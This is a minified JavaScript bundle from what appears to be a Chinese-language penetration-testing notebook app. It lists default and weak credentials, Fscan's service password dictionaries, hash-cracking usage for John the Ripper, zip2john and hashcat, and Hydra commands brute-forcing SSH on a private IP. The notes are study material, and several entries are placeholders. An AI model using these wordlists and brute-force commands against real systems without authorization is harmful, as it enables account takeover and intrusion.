                      `))},{name:"Windows / \u8FDC\u7A0B\u684C\u9762",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                      \u7528\u6237\u540D\uFF1A
                          \u9ED8\u8BA4\u81EA\u5E26
                              Administrator
                      `))}]},{name:"Web\u4E1A\u52A1\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"Admin\u540E\u53F0\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u793E\u4EA4\u5E73\u53F0 / \u793E\u4EA4\u7F51\u7EDC",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u7535\u5546\u5E73\u53F0",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"QQ\u817E\u8BAF / \u5FAE\u4FE1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u7535\u5B50\u90AE\u7BB1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u624B\u673A\u53F7\u51ED\u8BC1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))}]}]},{name:"\u3010\u5E38\u89C1\u7528\u6237\u540D\u3011\u3001\u9AD8\u9891\u3010\u5F31\u5BC6\u7801\u3011\u3001\u3010\u5F31\u53E3\u4EE4\u3011",desc:l.a.createElement(l.a.Fragment,null),content:function(){var c=function(w){return l.a.createElement("li",{key:w},w)};return l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
                  \u7F51\u4E0A\uFF0C\u6700\u9AD8\u9891\u7684\u5F31\u5BC6\u7801
                      \u6743\u5A01\uFF1A
                          Most Common Passwords 2022 - Is Yours on the List? | CyberNews
                              https://cybernews.com/best-password-managers/most-common-passwords/

                      \u7F51\u4E0A\u6D41\u9732\u4E8E \u4E2D\u6587\u7F51\u7EDC\u7684\uFF1A
                          2018\u5F31\u5BC6\u7801TOP 100 - \u4EE3\u7801\u5148\u950B\u7F51
                              https://www.codeleading.com/article/1040284518/

          \u7528\u6237\u540D\uFF1A
                  admin
                  test

                  \u7F51\u4E0A\uFF0C\u522B\u4EBA\u7ECF\u5E38\u7528\u7684\uFF0C\u5E38\u89C1\u7528\u6237\u540D\uFF1A
                      administrator

          \u5BC6\u7801\uFF1A
                  \u4E2A\u4EBA\u6536\u96C6\u7684\u4E00\u4E9B\uFF0C\u5E38\u89C1\u5F31\u5BC6\u7801\uFF1A
                          admin
                          admin123
                          123456
                          admin666
                          admin888
                          admin789

                  888888
                  test

                  \u7F51\u4E0A\uFF0C\u522B\u4EBA\u7ECF\u5E38\u7528\u7684\uFF0C\u5E38\u89C1\u5F31\u5BC6\u7801\uFF1A
                          admin
                          administrator
                          password
                          123456789
                          qwerty
                          12345
                          qwerty123
                          1q2w3e
                          12345678
                          111111
                          1234567890


          `))}()}]},{name:"\u5927\u800C\u5168\u2014\u2014\u2014\u2014\u3010\u7F51\u4E0A\u8BCD\u5178\u3011   \uFF08\u7F51\u4E0A\u6CA1\u6709\u5C0F\u800C\u7CBE\u7684\uFF0C\u9664\u4E86Fscan\uFF09",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          Fscan\uFF0C\u81EA\u5E26\u3010\u5C0F\u800C\u7CBE\u3011\u8BCD\u5178\u5E93\u3002
                  \u5305\u542B\u3010\u4E2D\u95F4\u4EF6\u3011\uFF1A
                          ftp
                                  {"ftp", "admin", "www", "web", "root", "db", "wwwroot", "data"},
                          mysql
                                  {"root", "mysql"},
                          mssql
                                  {"sa", "sql"},
                          smb
                                  {"administrator", "admin", "guest"},
                          rdp
                                  {"administrator", "admin", "guest"},
                          postgresql
                                  {"postgres", "admin"},
                          ssh
                                  {"root", "admin"},
                          mongodb
                                  {"root", "admin"},
                          oracle
                                  {"sys", "system", "admin", "test", "web", "orcl"},

                  \u5E38\u89C1\u5BC6\u7801        \uFF08\u6B64\u5904\u9700\u8981\u6CE8\u610F\uFF0C\u7528\u5230\u4E86  \u3010\u52A8\u6001\u62FC\u63A5\u3011+\u3010\u7528\u6237\u540D\u3011  \u7684\u64CD\u4F5C\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF09

                          {"123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321",
                          "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111",
                          "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "{user}@123#4",
                          "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe", "123qwe!@#",
                          "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888",
                          "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.",
                          "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ",
                          "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "Charge123", "Aa123456789"}


          \u5404\u4E2A\u6A21\u5757\uFF0C\u5404\u4E2ACMS\uFF0C\u81EA\u5E26\u7684\u4E00\u4E9B\u9ED8\u8BA4\u5BC6\u7801\u3001\u9ED8\u8BA4\u51ED\u8BC1\uFF1A

                          \u6211\u60F3\u4E86\u4E00\u4E0B\uFF0C\u8FD8\u662F\u5206\u6563\uFF0C\u653E\u5230\u3010\u5177\u4F53\u6A21\u5757\u3011\u91CC\u5427

                          \u4F8B\u5982\uFF1A
                              Tomcat
                              PRTG
                              Netmon
                              Magento
                              UniFi
                              Jenkins
                              RDP
                              SMB
                              \u2026\u2026\u2026\u2026\u7B49\u7B49


          \u7EFC\u5408\u3010\u8BCD\u5178\u6E05\u5355\u3011

                          \u9AD8\u4EF7\u503C\uFF1A
                              \u3010@danielmiessler\u2019s SecLists\u3011\uFF0C\u5305\u542B\u4E86\u6781\u591A\u7684\u8BCD\u5178\u6536\u96C6\uFF0C\u4E5F\u6BD4\u8F83\u7ECF\u5178\uFF1Ahttps://github.com/danielmiessler/SecLists

                          \u4E2D\u4EF7\u503C\uFF1A
                              \u5404\u79CD\u8BCD\u5178\u7684\u7C7B\u578B\uFF0C\u7B80\u5355\u7684\u4E00\u4E2A\u641C\u7F57\uFF1Ahttps://www.cnblogs.com/bonelee/p/9323488.html



          HTB             `.concat(p.HTB_\u63D0\u4F9B\u8BCD\u5178,`







          `)))},{name:"\u3010\u5BC6\u7801\u7834\u89E3\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u786E\u5B9A\u3010\u52A0\u5BC6\u7C7B\u578B\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u52A0\u5BC6\u7C7B\u578B\u4ECB\u7ECD\uFF1A
                  \u3010Hash\u51FD\u6570\u3011
                      \u53C8\u79F0\u3010\u6563\u5217\u51FD\u6570\u3011\u3002
                      \u5305\u62EC\uFF1A
                          \u53C2\u8003\u8D44\u6599\uFF1Ahttps://zh.wikipedia.org/wiki/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B8

                          HAVAL\u3001
                          MD2\u3001MD4\u3001MD5\u3001
                          PANAMA\u3001RadioGat\xFAn\u3001
                          RIPEMD\u3001RIPEMD-128/256\u3001RIPEMD-160/320\u3001
                          SHA-0\u3001SHA-1\u3001SHA-256/224\u3001SHA-512/384\u3001
                          Tiger\uFF082\uFF09-192/160/128\u3001WHIRLPOOL\u3001


              \u786E\u5B9A\u3010hash\u503C\u3011\u7C7B\u578B

                  \u547D\u4EE4\uFF1A

                      hashid

                          hashid  <\u5177\u4F53hash\u503C>
                              \u7ED3\u679C\u4E2D\uFF0C\u4F1A\u7ED9\u51FA\u4E00\u4E9B\u3010\u53EF\u80FDhash\u7C7B\u578B\u3011\u7684\u731C\u6D4B

                      123

                  \u5DE5\u5177

                      123

              \u786E\u5B9A 123

              `))},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010MD5\u52A0\u5BC6\u3011\u53CD\u67E5\u3001",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              MD5\u52A0\u5BC6\u53CD\u67E5
                  crackstation.net

              MD5\u52A0\u5BC6\u89E3\u5BC6_\u5929\u5929\u67E5\u8BE2
                  md5.ttcha.net

                      \u9664\u6B64\u4E4B\u5916\uFF0C\u300A\u5929\u5929\u67E5\u8BE2\u300B\u8FD8\u4ECB\u7ECD\u4E86\u51E0\u4E2A\u5176\u5B83\u7684\u7AD9\uFF1A
                          \u56FD\u5185    www.cmd5.com        \u514D\u8D39+\u6536\u8D39
                          \u56FD\u5185    pmd5.com            \u514D\u8D39
                          \u56FD\u5185    www.xmd5.com        \u514D\u8D39+\u6536\u8D39
                          \u56FD\u5916    md5.gromweb.com     \u514D\u8D39
                          \u56FD\u5185    www.ttmd5.com       \u514D\u8D39

              `))},{name:"\u3010John The Ripper\u3011\u3001\u4EE5\u53CA\u3010\u3010zip2john\u3011\u5B50\u6A21\u5757\u7B49",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4ECB\u7ECD\uFF1A

              \u5404\u79CD\u52A0\u5BC6\u5BC6\u7801\u683C\u5F0F\u8FD0\u884C\uFF1A

                  \u5305\u62EC\u5728\u5404\u79CD Unix \u7248\u672C\uFF08\u57FA\u4E8E DES\u3001MD5 \u6216 Blowfish\uFF09\u4E0A\u6700\u5E38\u89C1\u7684\u51E0\u79CD\u52A0\u5BC6\u5BC6\u7801\u54C8\u5E0C\u7C7B\u578B \u3002
                  Kerberos AFS \u548C Windows NT/2000/XP/2003 LM \u54C8\u5E0C \u3002

                  \u5176\u4ED6\u6A21\u5757\u6269\u5C55\u4E86\u5B83\u7684\u80FD\u529B
                      \u5305\u62EC\u57FA\u4E8E MD4 \u7684\u5BC6\u7801\u54C8\u5E0C\u548C\u5B58\u50A8\u5728 LDAP\u3001MySQL \u7B49\u4E2D\u7684\u5BC6\u7801 \u3002


          \u8FD0\u884C\uFF1A

              \u7834\u89E3\u5BC6\u7801

                  john  -wordlist=<\u672C\u5730\u8BCD\u5178>    <hash\u503C\u6587\u4EF6>
                      \u53EF\u4EE5\u901A\u8FC7\u3010zip2john\u3011\uFF0C\u5F97\u5230\u3010hash\u503C\u6587\u4EF6\u3011\u3002

                  john  hash  --format=<\u7F16\u7801\u683C\u5F0F>  --wordlist=<\u672C\u5730\u8BCD\u5178>  --rules=<\u89C4\u5219\u96C6>
                      \u3010--format\u3011\uFF0C123
                      \u3010--wordlist\u3011\uFF0C---
                      \u3010--rules\u3011\uFF0C---

              \u56DE\u663E\u5BC6\u7801

                  john  --show  <hash\u503C\u6587\u4EF6>

                      \u7ED3\u679C\uFF1A
                          \u4EE5\u3010\u6587\u4EF6\u540D:\u5BC6\u7801::\u3011\u7684\u5F62\u5F0F\u663E\u793A

              \u5E38\u7528\u9009\u9879\uFF1A
                  \u3010--fork\u3011\uFF0C\uFF1F\uFF1F\uFF1F

          `))},{name:"\u3010zip2john\u3011 \u6A21\u5757\u547D\u4EE4",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              zip2john  <zip\u6587\u4EF6>  >  <\u5BFC\u51FA\u6587\u4EF6\u540D\u79F0\u5982hashes>


              \u5E38\u89C1\u9009\u9879\uFF1A
                  \u3010-o\u3011\uFF0C\u6307\u5B9A\u5F53\u6587\u4EF6
                      \u539F\u56E0\uFF1A\u6709\u65F6\u5019\u3010\u4E0D\u540C\u6587\u4EF6\u3011\u91C7\u7528\u4E86\u3010\u4E0D\u540C\u5BC6\u7801\u3011\uFF0C\u9700\u5355\u72EC\u5904\u7406\u3002

              `))},u.ssh2john____ssh_2_John_The_Ripper____cfg]},{name:"\u3010hashcat\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010hashcat\u3011

                  \u4ECB\u7ECD
                      \u7834\u89E3\u3010hash\u503C\u3011

                  \u8FD0\u884C
                      hashcat  -a  0  -m  0  <hash\u503C\u6587\u4EF6>  <\u672C\u5730\u8BCD\u5178>
                          \u3010-a\u3011\uFF0C\u653B\u51FB\u6A21\u5F0F

                          \u3010-m\u3011\uFF0Chash\u7C7B\u578B

                          \u7ED3\u679C\uFF1A
                              \u4EE5\u3010hash:\u5BC6\u7801\u3011\u7684\u5F62\u5F0F\u663E\u793A

                  \u5E38\u89C1\u9009\u9879
                      \u3010-a\u3011\uFF0C\u9009\u62E9\u3010\u653B\u51FB\u6A21\u5F0F\u3011
                          0\uFF0C\u4EE3\u8868\u3010\u8BCD\u5178\u653B\u51FB\u3011
                          1\uFF0C\u4EE3\u8868\u3010\u7EC4\u5408\u653B\u51FB\u3011
                          3\uFF0C\u4EE3\u8868\u3010\u86EE\u529B\u653B\u51FB\u3011\u3001\u3010\u9762\u5177\u653B\u51FB\u3011
                          \u3010\u6DF7\u5408\u653B\u51FB\u3011
                              6\uFF0C\u3010\u8BCD\u5178+\u9762\u5177\u3011
                              7.\u3010\u9762\u5177+\u8BCD\u5178\u3011
                          9\uFF0C\u4EE3\u8868\u3010\u5173\u8054\u653B\u51FB\u3011

                      \u3010-m\u3011\uFF0Chash\u7C7B\u578B
                          0\uFF0C\u4EE3\u8868\u3010MD5 | Raw hash\u3011

                      \u3010--force\u3011
                          \uFF1F\uFF1F\uFF1F

                      \u3010-w\u3011
                          \uFF1F\uFF1F\uFF1F

                      \u3010-o\u3011
                          \uFF1F\uFF1F\uFF1F

              `))},{name:"\u3010Hydra\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,l.a.createElement(m.b,{special_name:"Hydra",var_names_arr:["users_dict","pwd_dict","ip","protocol_\u53EF\u7A7A"],code_template_arr:["hydra  -L  ###<users_dict>###  -P  ###<pwd_dict>###  ssh://###<ip>###  -t  4  ###<protocol_\u53EF\u7A7A>###"]}),E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010Hydra\u3011

              \u8D44\u6599\uFF1A
                  \u5927\u8303\u56F4\u4ECB\u7ECD\uFF1Ahttps://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/
                  \u8BE6\u7EC6\u4F7F\u7528\uFF1Ahttps://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh

              \u547D\u4EE4\uFF1A

                  hydra  -L  users.txt  -P  passwords.txt  ssh://172.16.1.102  -t  4
                      \u3010-l\u3011
                          \u6307\u5B9A\u7528\u6237\u540D
                      \u3010-L\u3011
                          \u6307\u5B9A\u3010\u7528\u6237\u540D\u8BCD\u5178\u3011
                      \u3010-p\u3011
                          \u6307\u5B9A\u5BC6\u7801
                      \u3010-P\u3011
                          \u6307\u5B9A\u3010\u5BC6\u7801\u8BCD\u5178\u3011
                      \u3010-t\u3011
                          \u7EBF\u7A0B\u6570

                  hydra  -L  users.txt  -P  passwords.txt  ssh://172.16.1.102  -t  4    ssh

              `))}]}]},g=I},yvwo:function(H,d,n){H.exports={"ant-pro-menu-item-title":"ant-pro-menu-item-title___1mblt","ant-menu-item":"ant-menu-item___3Mgb7","ant-menu-submenu-title":"ant-menu-submenu-title___2LpSZ",koanList:"koanList___11yjA",ftDrawer:"ftDrawer___1xnqD",quickBtns:"quickBtns___HlLsS",doc:"doc___3d_zx",subDesc:"subDesc___Gby9d",toolList:"toolList___3E-b4",toolFlags:"toolFlags___3kDtQ",combined_searchCp:"combined_searchCp___3gdCg"}},z0Yr:function(H,d,n){"use strict";n.d(d,"a",function(){return m});var S=n("k1fw"),t=n("oBTY"),l=n("fWQN"),r=n("mtLc"),e=n("ysNt"),u=n("E3zn"),m=function(){function E(){Object(l.a)(this,E)}return Object(r.a)(E,null,[{key:"_\u7EDF\u4E00\u8FDB\u884C\u63D0\u53D6____\u6839\u636E\u65B9\u6846\u6B63\u5219____\u62FF\u5230\u5FC5\u8981\u7684\u6240\u6709\u8D44\u6599\u540E",value:function(p){var I=E._\u6839\u636E_\u5404\u79CD\u63D0\u53D6\u51FA\u7684\u6587\u672C_\u5E26_\u624B\u52A8\u65B9\u6846\u6B63\u5219____\u8FDB\u884C\u6B63\u5219\u5339\u914D_\u7136\u540E\u5F97\u51FA\u6807\u51C6Bean(p),g=E._\u63D0\u53D6\u51FA_\u4E00\u7EC4\u5BF9\u8C61\u4E2D\u7684_\u6240\u6709\u65B9\u6846\u5173\u952E\u5B57(I);return{_\u6B63\u5219\u5173\u952E\u5B57_BeanMap:I,_\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr:g}}},{key:"_\u63D0\u53D6\u51FA_\u4E00\u7EC4\u5BF9\u8C61\u4E2D\u7684_\u6240\u6709\u65B9\u6846\u5173\u952E\u5B57",value:function(p){return u.a.noRepeat_rtnNew(p.reduce(function(I,g){return[].concat(Object(t.a)(g.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57),Object(t.a)(I))},[]))}},{key:"_\u6839\u636E_\u5404\u79CD\u63D0\u53D6\u51FA\u7684\u6587\u672C_\u5E26_\u624B\u52A8\u65B9\u6846\u6B63\u5219____\u8FDB\u884C\u6B63\u5219\u5339\u914D_\u7136\u540E\u5F97\u51FA\u6807\u51C6Bean",value:function(p){var I=p.map(function(g){var c=g._\u7528\u6237\u8F93\u5165\u7EAFtext_\u4E2D\u95F4\u6B63\u6587_\u53EF\u80FD\u624B\u52A8\u65B9\u6846\u6B63\u5219,h=g._\u6765\u81EA\u667A\u80FD\u6B65\u9AA4\u7684\u6587\u672C_\u4E2D\u95F4\u53EF\u80FD\u5728\u6807\u9898_\u624B\u52A8\u65B9\u6846\u6B63\u5219,w=g.components,a=/【([^】]*)】/igm,B=[].concat(Object(t.a)(c.matchAll(a)),Object(t.a)(h.matchAll(a))),O=B.map(function(_){var b=_[1];if(b.length===0)throw new Error(`\u6709\u4E00\u6761\uFF0C\u6B63\u5219\u5339\u914D\u8BCD\u4E3A\u3010\u7A7A\u5B57\u7B26\u4E32\u3011\u7684\u6761\u76EE
`.concat(c,`
          `).concat(_,`
          \u4EE5\u53CA\uFF0C\u6CE8\u610F\uFF0C\u53EF\u80FD\u6709\u3010SmartCfg\u3011\u7684 cfg\u3010name\u3011\u5B57\u6BB5`));return b.toLowerCase()});if(!(O.length>0))throw new Error(`\u6709\u4E00\u6761\uFF0C\u6B63\u5219\u5339\u914D\u8BCD \u6570\u91CF\u4E3A\u30100\u3011\u7684\u6761\u76EE
`.concat(c));return E._\u62FC\u63A5\u6210Bean({components:w,_\u7528\u6237\u8F93\u5165\u7EAFtext_\u4E2D\u95F4\u6B63\u6587_\u53EF\u80FD\u624B\u52A8\u65B9\u6846\u6B63\u5219:c,_\u65B9\u6846\u5173\u952E\u5B57arr_\u65B9\u6846\u5339\u914D\u5230\u7684:O})});return I}},{key:"_\u62FC\u63A5\u6210Bean",value:function(p){var I=p.components,g=p._\u7528\u6237\u8F93\u5165\u7EAFtext_\u4E2D\u95F4\u6B63\u6587_\u53EF\u80FD\u624B\u52A8\u65B9\u6846\u6B63\u5219,c=p._\u65B9\u6846\u5173\u952E\u5B57arr_\u65B9\u6846\u5339\u914D\u5230\u7684,h={simple_name:g,question:[g],answer:[g],\u76F8\u5173\u7EC4\u4EF6:I,relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57:c},w={name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:h.simple_name,koans_\u63D0\u793A:h.answer,desc:h.simple_name.split(`
`)[1]||"\uFF08\u7B2C\u4E00\u884C\u672A\u627E\u5230\uFF09",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:e.l.get_regex_fromArrKeywords(h.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57.map(function(a){return a.valueOf()}))};return Object(S.a)(Object(S.a)({},h),w)}}]),E}()}}]);
